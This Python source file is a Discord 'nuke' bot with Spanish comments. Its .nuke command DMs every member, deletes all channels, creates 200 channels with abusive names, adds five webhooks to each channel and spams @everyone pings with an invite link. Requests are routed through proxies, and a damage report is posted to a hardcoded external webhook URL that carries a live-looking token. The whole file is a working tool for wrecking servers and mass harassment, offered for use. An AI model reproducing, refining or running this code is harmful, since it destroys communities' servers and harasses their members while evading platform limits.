import discord
from discord.ext import commands
import random
import asyncio
import time
import os
import aiohttp

# ───────────────────────────────────────────────
# INTENTS
# ───────────────────────────────────────────────
intents = discord.Intents.all()

bot = commands.Bot(command_prefix='.', intents=intents)

print("Bot booting… System online.\n")

# ───────────────────────────────────────────────
# CONFIGURACIÓN
# ───────────────────────────────────────────────

CHANNEL_NAMES = [
    "ur a bitchh", "get rekt", "nuked by Bigm", "chaos incoming",
    "owo explosion", "server wipe", "BYE BYE", "The Void",
    "Bigm Was Here", "RATIO"
]

TARGET_CHANNELS = 200
TARGET_PINGS = 2000
CONCURRENCY_LIMIT = 100

LOG_CHANNEL_NAME = "﹗logs"
WEBHOOK_URL = "https://discord.com/api/webhooks/1438649141851979776/p8c52p4cNv7SGBXkz0L_liPgD2_3D5p2TjDZfQTRTGAH2FyNO452lUHmqIAyrG4m0cyp"

MESSAGE_TO_MEMBERS = "You have been invaded by voidxn"

# PROXIES
PROXY_LIST = [
    "http://138.201.245.91:8080",
    # Agrega más proxies aquí
]

ACTIVE_PROXIES = []
PROXY_CHECK_INTERVAL = 30

semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)

# ───────────────────────────────────────────────
# FUNCIONES
# ───────────────────────────────────────────────

async def clear_console_task():
    while True:
        await asyncio.sleep(2)
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"[{time.strftime('%H:%M:%S')}] Console refreshed — Bot active.")

async def is_proxy_working(proxy):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://www.google.com", proxy=proxy, timeout=5) as response:
                return response.status == 200
    except:
        return False

async def update_active_proxies():
    global ACTIVE_PROXIES
    ACTIVE_PROXIES = [proxy for proxy in PROXY_LIST if await is_proxy_working(proxy)]
    print(f"Proxies activos: {len(ACTIVE_PROXIES)}")

async def proxy_check_task():
    while True:
        await update_active_proxies()
        await asyncio.sleep(PROXY_CHECK_INTERVAL)

async def get_proxy():
    if not ACTIVE_PROXIES:
        print("No hay proxies activos. Esperando...")
        await update_active_proxies()
        if not ACTIVE_PROXIES:
            return None
    return random.choice(ACTIVE_PROXIES)

async def send_message_to_members(guild, message):
    for m in guild.members:
        try:
            dm = await m.send(message)
        except:
            pass

async def create_log(guild, ctx, duration):
    log_ch = discord.utils.get(guild.channels, name=LOG_CHANNEL_NAME)

    if not log_ch:
        try:
            log_ch = await guild.create_text_channel(LOG_CHANNEL_NAME)
        except:
            return

    embed = discord.Embed(
        title="SERVER DAMAGE REPORT",
        description="Nuke command executed.",
        color=discord.Color.red()
    )
    embed.add_field(name="Server", value=guild.name, inline=False)
    embed.add_field(name="Initiator", value=ctx.author.mention, inline=True)
    embed.add_field(name="Duration", value=f"{duration:.2f}s", inline=True)

    await log_ch.send(embed=embed)

async def send_webhook(duration, proxy=None):
    data = {
        "username": "Nuke Bot",
        "embeds": [{
            "title": "SERVER DAMAGE REPORT",
            "description": f"Nuke executed in {duration:.2f}s",
            "color": 16711680
        }]
    }

    try:
        async with aiohttp.ClientSession() as session:
            if proxy:
                async with session.post(WEBHOOK_URL, json=data, proxy=proxy) as response:
                    if response.status != 204:
                        print(f"[WEBHOOK ERROR] {response.status}")
            else:
                async with session.post(WEBHOOK_URL, json=data) as response:
                    if response.status != 204:
                        print(f"[WEBHOOK ERROR] {response.status}")
    except Exception as e:
        print(f"[WEBHOOK ERROR] {e}")

async def create_and_spam(ctx, channel_name):
    try:
        ch = await ctx.guild.create_text_channel(channel_name)

        # Crear múltiples webhooks para enviar mensajes en paralelo
        webhooks = []
        for _ in range(5):  # Crear 5 webhooks por canal
            webhook = await ch.create_webhook(name=f"Nuke Webhook")
            webhooks.append(webhook)

        async def send_pings(webhook):
            proxy = await get_proxy()
            try:
                async with aiohttp.ClientSession() as session:
                    for _ in range(TARGET_PINGS // TARGET_CHANNELS // 5):  # Dividir los pings entre los webhooks
                        try:
                            if proxy:
                                await session.post(webhook.url, data={"content": "@everyone nuked by Bigm https://discord.gg/Duhk3RTsfA"}, proxy=proxy)
                            else:
                                await session.post(webhook.url, data={"content": "@everyone nuked by Bigm https://discord.gg/Duhk3RTsfA"})
                        except Exception as e:
                            print(f"[SEND ERROR] {e}")
            except Exception as e:
                print(f"[WEBHOOK SESSION ERROR] {e}")

        # Enviar pings con todos los webhooks en paralelo
        await asyncio.gather(*(send_pings(webhook) for webhook in webhooks))

    except Exception as e:
        print(f"[ERROR] {e}")

@bot.command(name="nuke")
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    start = time.time()
    guild = ctx.guild

    await send_message_to_members(guild, MESSAGE_TO_MEMBERS)

    # Eliminar canales existentes
    await asyncio.gather(*(ch.delete() for ch in guild.channels), return_exceptions=True)

    channel_creation_tasks = []
    for i in range(1, TARGET_CHANNELS + 1):
        channel_name = random.choice(CHANNEL_NAMES) + f"-{i}"
        channel_creation_tasks.append(create_and_spam(ctx, channel_name))

    await asyncio.gather(*channel_creation_tasks, return_exceptions=True)

    duration = time.time() - start
    await create_log(guild, ctx, duration)
    await send_webhook(duration)

    await ctx.send(f"✔️ Nuke complete in {duration:.2f}s.")

@bot.event
async def on_ready():
    print(f"Connected as {bot.user.name}")
    bot.loop.create_task(clear_console_task())
    bot.loop.create_task(proxy_check_task())

# Iniciar la verificación de proxies al inicio
async def start_proxy_check():
    await bot.wait_until_ready()
    await update_active_proxies()

bot.loop.create_task(start_proxy_check())

# ───────────────────────────────────────────────
print("Bot running…")
bot.run(os.getenv("TOKEN"))
